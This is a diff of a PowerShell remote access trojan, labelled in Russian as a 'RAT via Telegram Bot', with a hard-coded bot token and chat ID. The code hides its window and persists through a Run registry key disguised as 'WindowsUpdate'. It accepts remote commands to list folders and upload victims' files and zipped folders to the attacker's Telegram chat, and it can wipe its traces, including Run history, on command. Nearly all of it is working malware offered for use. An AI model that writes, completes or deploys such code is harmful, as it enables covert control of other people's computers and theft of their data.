@@ -1,153 +1,136 @@
 # RAT через Telegram Bot
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
-$CurrentDir = Get-Location
-$LastMessage = ""
 
-# Функция отправки сообщений без дублирования
-function Send-TGMessage {
-    param($Text)
-    if ($Text -eq $LastMessage) { return }
-    $uri = "https://api.telegram.org/bot$Token/sendMessage"
+# Настройки скрытности
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# Скрытие окна PowerShell
+$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
+$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
+
+# Функция отправки сообщений
+function Send-Telegram {
+    param([string]$Message, [string]$FilePath = $null)
+    
+    $lastMessage = $global:LastSentMessage
+    if ($Message -eq $lastMessage) { return }
+    $global:LastSentMessage = $Message
+    
+    $url = "https://api.telegram.org/bot$Token/sendMessage"
     $body = @{
         chat_id = $ChatID
-        text = $Text
+        text = $Message
         parse_mode = "HTML"
-    } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body
-        $script:LastMessage = $Text
-    } catch { }
-}
-
-# Функция скачивания файла
-function Send-File {
-    param($Path)
-    $uri = "https://api.telegram.org/bot$Token/sendDocument"
-    $boundary = [System.Guid]::NewGuid().ToString()
-    
-    if (Test-Path $Path -PathType Container) {
-        $zipPath = "$env:TEMP\$(Get-Random).zip"
-        Compress-Archive -Path $Path -DestinationPath $zipPath
-        $filePath = $zipPath
-    } else {
-        $filePath = $Path
     }
-
-    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-    $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-    $LF = "`r`n"
-
-    $body = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"chat_id`"$LF",
-        $ChatID,
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $filePath -Leaf)`"",
-        "Content-Type: application/octet-stream$LF",
-        $fileEnc,
-        "--$boundary--$LF"
-    ) -join $LF
-
+    
     try {
-        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
     } catch { }
     
-    if (Test-Path $Path -PathType Container) { Remove-Item $zipPath }
+    if ($FilePath -and (Test-Path $FilePath)) {
+        $fileUrl = "https://api.telegram.org/bot$Token/sendDocument"
+        $fileBody = @{chat_id = $ChatID; document = Get-Item $FilePath}
+        try {
+            Invoke-RestMethod -Uri $fileUrl -Method Post -Form $fileBody -UseBasicParsing | Out-Null
+        } catch { }
+    }
 }
 
-# Функция самоуничтожения
-function SelfDestruct {
-    # Удаление из автозагрузки
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
-    
-    # Очистка истории Run
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-    
-    # Удаление скрипта
-    $scriptPath = $MyInvocation.MyCommand.Path
-    Start-Sleep 2
-    Remove-Item $scriptPath -Force
-    exit
-}
-
-# Добавление в автозагрузку
+# Установка в автозагрузку
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-if (-not (Get-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue)) {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-}
+$scriptPath = "$env:TEMP\WindowsUpdate.exe"
+if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
+Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
 
-# Скрытие окна
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
+# Основные переменные
+$currentDir = "C:\"
+$global:LastSentMessage = ""
 
-# Основной цикл обработки команд
+# Отправка информации о запуске
+Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help - список команд`n/ls - список файлов`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл`n/selfdestruct - самоуничтожение"
+
+# Основной цикл опроса
 while ($true) {
     try {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get
+        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get -UseBasicParsing
         if ($updates.ok -and $updates.result.Count -gt 0) {
             $lastUpdate = $updates.result[-1]
-            $message = $lastUpdate.message
-            if ($message -and $message.chat.id -eq $ChatID) {
-                $text = $message.text
-                $updateId = $lastUpdate.update_id
+            if ($lastUpdate.message.chat.id -eq $ChatID) {
+                $command = $lastUpdate.message.text
+                $messageId = $lastUpdate.update_id
                 
                 # Обработка команд
-                switch -regex ($text) {
+                switch -regex ($command) {
                     "^/help$" {
-                        $helpText = @"
-Доступные команды:
-/help - Список команд
-/ls - Список файлов
-/cd [path] - Смена директории
-/download [file/folder] - Скачать файл/папку
-/selfdestruct - Самоуничтожение
-"@
-                        Send-TGMessage -Text $helpText
+                        Send-Telegram "Доступные команды:`n/help - показать это сообщение`n/ls - список файлов в текущей директории`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл или папку`n/selfdestruct - самоуничтожение RAT"
                     }
                     "^/ls$" {
-                        $files = Get-ChildItem -Path $CurrentDir | ForEach-Object {
-                            if ($_.PSIsContainer) { "[DIR] $($_.Name)" } else { "[FILE] $($_.Name) $($_.Length/1KB) KB" }
+                        $files = Get-ChildItem -Path $currentDir -Force | Select-Object Name,Length,LastWriteTime
+                        $fileList = @()
+                        foreach ($file in $files) {
+                            $type = if ($file.PSIsContainer) { "📁" } else { "📄" }
+                            $size = if ($file.Length) { " ($([math]::Round($file.Length/1KB,2)) KB)" } else { "" }
+                            $fileList += "$type $($file.Name)$size - $($file.LastWriteTime)"
                         }
-                        $fileList = if ($files) { $files -join "`n" } else { "Папка пуста" }
-                        Send-TGMessage -Text "Содержимое $CurrentDir`n$fileList"
+                        Send-Telegram "Содержимое $currentDir`n$($fileList -join "`n")"
                     }
                     "^/cd (.+)$" {
-                        $newPath = $matches[1]
-                        if (Test-Path $newPath -PathType Container) {
-                            Set-Location $newPath
-                            $CurrentDir = Get-Location
-                            Send-TGMessage -Text "Перешел в $CurrentDir"
+                        $newDir = $matches[1]
+                        if ($newDir -eq "..") {
+                            $currentDir = Split-Path $currentDir -Parent
+                            if (!$currentDir) { $currentDir = "C:\" }
                         } else {
-                            Send-TGMessage -Text "Директория не найдена"
+                            $testPath = Join-Path $currentDir $newDir
+                            if (Test-Path $testPath -PathType Container) {
+                                $currentDir = $testPath
+                            } else {
+                                Send-Telegram "Директория не найдена: $newDir"
+                            }
                         }
+                        Send-Telegram "Текущая директория: $currentDir"
                     }
                     "^/download (.+)$" {
                         $target = $matches[1]
-                        if (Test-Path $target) {
-                            Send-TGMessage -Text "Начинаю загрузку..."
-                            Send-File -Path $target
+                        $fullPath = Join-Path $currentDir $target
+                        if (Test-Path $fullPath) {
+                            if (Test-Path $fullPath -PathType Container) {
+                                # Архивируем папку
+                                $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
+                                Add-Type -Assembly System.IO.Compression.FileSystem
+                                [System.IO.Compression.ZipFile]::CreateFromDirectory($fullPath, $zipPath)
+                                Send-Telegram "Папка $target заархивирована" $zipPath
+                                Remove-Item $zipPath -Force
+                            } else {
+                                Send-Telegram "Файл $target отправлен" $fullPath
+                            }
                         } else {
-                            Send-TGMessage -Text "Файл/папка не найдены"
+                            Send-Telegram "Файл/папка не найдены: $target"
                         }
                     }
                     "^/selfdestruct$" {
-                        Send-TGMessage -Text "Начинаю самоуничтожение..."
-                        SelfDestruct
+                        # Очистка истории RUN
+                        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                        
+                        # Удаление из автозагрузки
+                        Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -Force -ErrorAction SilentlyContinue
+                        
+                        # Удаление файлов
+                        if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
+                        if (Test-Path $MyInvocation.MyCommand.Path) { Remove-Item $MyInvocation.MyCommand.Path -Force }
+                        
+                        Send-Telegram "RAT самоуничтожен. Все следы удалены."
+                        exit
                     }
                 }
                 
                 # Отмечаем сообщение как обработанное
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($updateId + 1)" -Method Get | Out-Null
+                Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($messageId + 1)" -Method Get -UseBasicParsing | Out-Null
             }
         }
     } catch { }
-    Start-Sleep 2
+    Start-Sleep -Seconds 2
 }
